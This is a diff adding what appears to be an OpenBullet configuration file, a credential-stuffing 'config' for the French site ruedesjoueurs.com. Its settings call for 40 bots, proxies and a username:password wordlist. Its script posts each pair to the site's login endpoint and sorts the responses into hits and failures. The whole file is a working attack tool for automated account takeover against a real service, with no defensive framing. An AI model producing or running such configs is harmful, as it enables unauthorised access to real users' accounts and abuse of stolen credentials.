@@ -1,0 +1,37 @@
+[SETTINGS]
+{
+  "Name": "Ruedesjoueurs",
+  "SuggestedBots": 40,
+  "LastModified": "2018-09-20T23:56:53.2837793+00:00",
+  "AdditionalInfo": "No Capture",
+  "Author": "RADIKAL",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://www.ruedesjoueurs.com/connexion.html?task=user.login" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&return=&73ac41761872ae1f2b2e4996fd398211=1" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "type:\"com_users/login\"" 
+  KEYCHAIN Success OR 
+    KEY "type:\"com_inscription/zonemembre\"" 
